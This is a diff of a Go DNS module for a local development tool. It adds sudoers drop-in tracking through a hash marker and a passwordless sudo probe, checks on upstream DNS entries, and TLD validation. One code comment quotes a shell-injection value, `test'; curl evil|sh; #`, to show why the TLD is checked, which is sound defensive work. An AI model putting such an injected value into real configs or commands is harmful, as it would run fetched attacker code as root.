@@ -2,17 +2,139 @@ package dns
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
 	"github.com/gabriel-sousa99/lerd/internal/config"
 )
+
+// sudoersMarkerPath is a user-owned record of the sudoers drop-in lerd last
+// installed. /etc/sudoers.d is root-only (0750), so the invoking user cannot
+// read the drop-in back to compare content; without this marker InstallSudoers
+// would rewrite the file, and prompt for sudo, on every run. Overridable in tests.
+var sudoersMarkerPath = func() string {
+	return filepath.Join(config.DataDir(), "sudoers.sha256")
+}
+
+// sudoersInstalled reports whether a drop-in matching content was already
+// installed on this or a prior run, per the user-owned marker. The marker alone
+// can't tell a deleted drop-in from an intact one (the root-only file is
+// unreadable), so a matching marker is additionally checked against a live
+// passwordless probe: only a conclusive "the grant is gone" answer forces a
+// reinstall, an inconclusive probe leaves the marker's verdict standing.
+func sudoersInstalled(content []byte) bool {
+	got, err := os.ReadFile(sudoersMarkerPath())
+	if err != nil {
+		return false
+	}
+	sum := sha256.Sum256(content)
+	if strings.TrimSpace(string(got)) != hex.EncodeToString(sum[:]) {
+		return false
+	}
+	if permitted, conclusive := sudoProbe(); conclusive && !permitted {
+		return false
+	}
+	return true
+}
+
+// sudoersProbeCommand and sudoProbeArgs name a command the platform's drop-in
+// grants passwordless, invoked only to probe whether that grant is still live.
+// They are platform-specific (see setup.go / setup_darwin.go): the macOS drop-in
+// never grants resolvectl, so a shared Linux probe could never succeed there and
+// forced a sudoers rewrite on every run (issue #1101).
+
+// sudoProbe is the seam tests override. It reports whether the drop-in's
+// passwordless grant is currently live and whether the answer is conclusive.
+var sudoProbe = defaultSudoProbe
+
+// defaultSudoProbe asks sudo, without prompting, whether the invoking user may
+// run the granted command passwordless. Exit 0 means the grant is live (from the
+// drop-in or a broader rule); a refusal that asks for credentials means it is
+// gone; anything else (no sudo, an unsupported flag) is inconclusive and defers
+// to the content marker so a working setup is never needlessly reinstalled.
+func defaultSudoProbe() (permitted, conclusive bool) {
+	var stderr bytes.Buffer
+	cmd := sudoProbeCmd()
+	cmd.Stderr = &stderr
+	if cmd.Run() == nil {
+		return true, true
+	}
+	if sudoRefusalIsConclusive(stderr.String()) {
+		return false, true
+	}
+	return false, false
+}
+
+// sudoProbeCmd builds the probe. It runs the granted command rather than listing
+// it with `sudo -l`, because listing reports whether the command is permitted at
+// all, which is true for anyone carrying a broader password-requiring rule like
+// ALL=(ALL) ALL, so the listing succeeded while running it still prompted.
+// Running the command is the only thing that answers the question being asked.
+// The chosen invocation touches nothing: resolvectl --version on Linux, an
+// idempotent `mkdir -p /etc/resolver` on macOS.
+func sudoProbeCmd() *exec.Cmd {
+	args := append([]string{"-n", sudoersProbeCommand}, sudoProbeArgs...)
+	cmd := exec.Command("sudo", args...)
+	cmd.Env = cLocaleEnv(os.Environ())
+	return cmd
+}
+
+// cLocaleEnv returns environ with the locale pinned to C, so sudo's refusal is
+// the English text the parser expects rather than a translation. The inherited
+// locale variables are dropped rather than overridden, because glibc's getenv
+// returns the first match and an appended value would be shadowed by the one
+// already there.
+func cLocaleEnv(environ []string) []string {
+	out := make([]string, 0, len(environ)+2)
+	for _, kv := range environ {
+		name, _, ok := strings.Cut(kv, "=")
+		if ok && (name == "LANG" || name == "LANGUAGE" || strings.HasPrefix(name, "LC_")) {
+			continue
+		}
+		out = append(out, kv)
+	}
+	return append(out, "LC_ALL=C", "LANG=C")
+}
+
+// sudoRefusalIsConclusive reports whether sudo's refusal proves the passwordless
+// grant is gone, rather than merely failing to answer. The two implementations
+// word it differently: classic sudo asks for a password, while sudo-rs, which
+// Ubuntu 26.04 ships, asks for interactive authentication. Matching only the
+// former read every sudo-rs refusal as inconclusive, so the stale marker won and
+// a deleted drop-in was never rewritten.
+func sudoRefusalIsConclusive(stderr string) bool {
+	s := strings.ToLower(stderr)
+	return strings.Contains(s, "password is required") ||
+		strings.Contains(s, "authentication is required")
+}
+
+// ForgetSudoersMarker deletes the user-owned marker so the next InstallSudoers
+// rewrites the drop-in even if unchanged. dns:repair needs it: the marker
+// records only content, not whether the root-only drop-in still exists, so a
+// deleted one would otherwise be skipped and never restored.
+func ForgetSudoersMarker() {
+	_ = os.Remove(sudoersMarkerPath())
+}
+
+// recordSudoersInstalled stores content's hash after a successful write so the
+// next run can skip the redundant, sudo-prompting rewrite.
+func recordSudoersInstalled(content []byte) {
+	if err := os.MkdirAll(filepath.Dir(sudoersMarkerPath()), 0755); err != nil {
+		return
+	}
+	sum := sha256.Sum256(content)
+	os.WriteFile(sudoersMarkerPath(), []byte(hex.EncodeToString(sum[:])+"\n"), 0644) //nolint:errcheck
+}
 
 // pastaDefaultForwarder is pasta's rootless-netns DNS forwarder IP, which
 // bridges into the host resolver and preserves .test routing. Last-resort
@@ -66,6 +188,43 @@ func sanitizeDNSIP(ip string) string {
 		return ""
 	}
 	return ip
+}
+
+// NormalizeUpstreamEntry validates a single dns.upstream entry, an IP with an
+// optional dnsmasq-style "#port" suffix, and returns its cleaned form. ok is
+// false when the IP is missing, malformed, loopback/unspecified, or the port
+// is not a number, so callers can report the bad entry back to the user.
+func NormalizeUpstreamEntry(entry string) (string, bool) {
+	ip, port, hasPort := strings.Cut(strings.TrimSpace(entry), "#")
+	clean := sanitizeDNSIP(ip)
+	if clean == "" {
+		return "", false
+	}
+	if hasPort {
+		n, err := strconv.Atoi(port)
+		if err != nil || n < 1 || n > 65535 {
+			return "", false
+		}
+		clean += "#" + port
+	}
+	return clean, true
+}
+
+// configuredUpstreamDNS returns the upstream DNS servers pinned in the global
+// config (dns.upstream), sanitized. Returns nil when none are configured or
+// none are usable, in which case callers fall back to auto-detection.
+func configuredUpstreamDNS() []string {
+	cfg, err := config.LoadGlobal()
+	if err != nil || cfg == nil {
+		return nil
+	}
+	var out []string
+	for _, entry := range cfg.DNS.Upstream {
+		if clean, ok := NormalizeUpstreamEntry(entry); ok {
+			out = append(out, clean)
+		}
+	}
+	return out
 }
 
 // WaitReady blocks until lerd-dns is accepting TCP connections on port 5300
@@ -123,6 +282,32 @@ func sudoWriteFile(path string, content []byte, mode os.FileMode) error {
 		return fmt.Errorf("chmod %s: %w", path, err)
 	}
 	return nil
+}
+
+// DefaultTLD is what lerd serves when the config names no TLD or names an
+// unusable one.
+const DefaultTLD = "test"
+
+// tldPattern is a single DNS label: letters, digits and hyphens. Nothing else can
+// be a TLD, and nothing else may reach the callers below.
+var tldPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)
+
+// ConfiguredTLD returns the TLD lerd serves, and refuses to return one that is
+// not a DNS label.
+//
+// Everything that writes or reads a .tld route has to agree on this: the dnsmasq
+// address records, the lerd0 link, the dispatcher and the diagnostic that checks
+// them. The validation is not cosmetic: this value is interpolated into the shell
+// command of a root-owned systemd unit that lerd writes and starts through its own
+// passwordless sudo grants, so a config.yaml carrying `tld: "test'; curl evil|sh; #"`
+// would otherwise be arbitrary code as root. Anything unusable falls back to the
+// default rather than reaching a shell.
+func ConfiguredTLD() string {
+	tld := config.EffectiveTLD()
+	if !tldPattern.MatchString(tld) {
+		return DefaultTLD
+	}
+	return tld
 }
 
 // WriteDnsmasqConfig writes the lerd dnsmasq config to the given directory,
@@ -210,15 +395,17 @@ func primaryLANIPv6() string {
 }
 
 // deriveV6Target picks the AAAA target for .test mirroring v4's reach:
-// loopback or empty → ::1; LAN-exposed → host's primary global v6, else ::1.
+// loopback or empty → ::1; LAN-exposed → host's primary global v6, or "" (no
+// AAAA record) when there is no reachable global v6.
 func deriveV6Target(v4 string) string {
 	if v4 == "" || v4 == "127.0.0.1" {
 		return "::1"
 	}
-	if v6 := primaryLANIPv6(); v6 != "" {
-		return v6
-	}
-	return "::1"
+	// LAN-exposed: publish only a real, reachable global v6. Falling back to
+	// ::1 here would answer remote AAAA queries with their own loopback, and
+	// flipping between a real v6 and ::1 as v6 connectivity comes and goes
+	// would churn the config. Omit AAAA entirely when there's no global v6.
+	return primaryLANIPv6()
 }
 
 // WriteDnsmasqConfigFor writes the lerd dnsmasq config with `target` as the
@@ -253,9 +440,10 @@ func WriteDnsmasqConfigDual(dir, v4Target, v6Target string) error {
 			fmt.Fprintf(&sb, "server=%s\n", ip)
 		}
 	}
-	fmt.Fprintf(&sb, "address=/.test/%s\n", v4Target)
+	tld := ConfiguredTLD()
+	fmt.Fprintf(&sb, "address=/.%s/%s\n", tld, v4Target)
 	if v6Target != "" {
-		fmt.Fprintf(&sb, "address=/.test/%s\n", v6Target)
+		fmt.Fprintf(&sb, "address=/.%s/%s\n", tld, v6Target)
 	}
 
 	return os.WriteFile(filepath.Join(dir, "lerd.conf"), []byte(sb.String()), 0644)
